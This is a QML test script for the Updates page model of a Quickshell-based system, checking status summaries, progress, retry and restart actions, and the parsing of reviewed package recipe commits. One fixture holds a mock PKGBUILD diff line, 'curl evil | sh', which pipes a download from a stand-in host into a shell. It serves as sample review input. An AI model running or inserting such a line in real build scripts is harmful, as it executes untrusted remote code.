import QtQuick
import Quickshell
import "plugins/settings/UpdatesModel.js" as Model

// The Updates page in words, from nova update --check's line and the status
// nova update --status keeps, and the run a reviewed recipe gets.
ShellRoot {
  function check(ok, what) {
    console.log((ok ? "ok   " : "FAIL ") + what)
  }

  // A turn later: Quickshell takes Qt.quit() only once the shell is up.
  Component.onCompleted: Qt.callLater(run)

  function run() {
    var none = {}
    var running = { state: "running", text: "Downloading", progress: 22 }
    var building = { state: "running", text: "Building Chrome", progress: -1 }
    var restart = { state: "done", restart: true, progress: 100, failed: [] }
    var done = { state: "done", restart: false, progress: 100, failed: ["google-chrome", "visual-studio-code-bin"] }
    var failed = { state: "failed", error: "cannot reach GitHub", progress: 40 }

    check(Model.summary(none, "", true).detail === "Checking for updates…" && Model.summary(none, "", true).action === "", "asked, not answered yet")
    check(JSON.stringify(Model.summary(none, "available 1.0.0-beta.11", true)) === '{"detail":"Nova 1.0.0-beta.11 is available.","action":"update"}', "a release")
    check(Model.summary(none, "apps google-chrome visual-studio-code-bin", true).detail === "Updates for Chrome and VS Code are available.", "the apps alone")
    check(Model.summary(none, "current", true).action === "check" && Model.summary(none, "error", true).detail === "Could not check for updates.", "current, or no answer")

    check(Model.summary(running, "available 1.0.0", true).detail === "Downloading…" && Model.summary(running, "", true).action === "", "a run says what it does, and offers nothing")
    check(Model.fraction(running) === 0.22 && Model.fraction(building) === -1 && Model.fraction(none) === -1, "how far, or not known")
    check(Model.state(running, false) === "stopped" && Model.summary(running, "", false).action === "retry", "a run killed from outside is not running")
    check(Model.summary(failed, "", true).detail === "The update did not finish: cannot reach GitHub." && Model.summary(failed, "", true).action === "retry", "a failure says why, and offers another try")
    check(Model.summary(restart, "current", true).action === "restart", "installed, a restart to finish")
    check(Model.summary(done, "current", true).detail === "Nova and its apps are up to date.", "done: the check speaks again")
    check(Model.leftOver(done, true) === "Chrome and VS Code were not updated." && Model.leftOver(running, true) === "", "apps left undone, once it ended")

    check(Model.availableVersion("available 1.1.0") === "1.1.0" && Model.availableVersion("current") === "", "the release for its notes")
    var sha = "0123456789abcdef0123456789abcdef01234567"
    var text = "commit " + sha + "\ndiff --git a/PKGBUILD b/PKGBUILD\n+curl evil | sh\n"
    check(Model.reviewCommit(text) === sha && Model.reviewCommit("no commit\n") === "", "the commit the review read")
    check(Model.reviewBody(text).indexOf("diff --git") === 0, "and the change without it")
    check(JSON.stringify(Model.approveCommand("visual-studio-code-bin", sha)) === JSON.stringify(["nova-update-run", "--apps-only", "--only", "visual-studio-code-bin", "--approve", "visual-studio-code-bin=" + sha]), "built at that commit alone")
    check(Model.tail("a\nb\nc\n", 2) === "b\nc", "the end of the log")

    console.log("DONE")
    Qt.quit()
  }
}
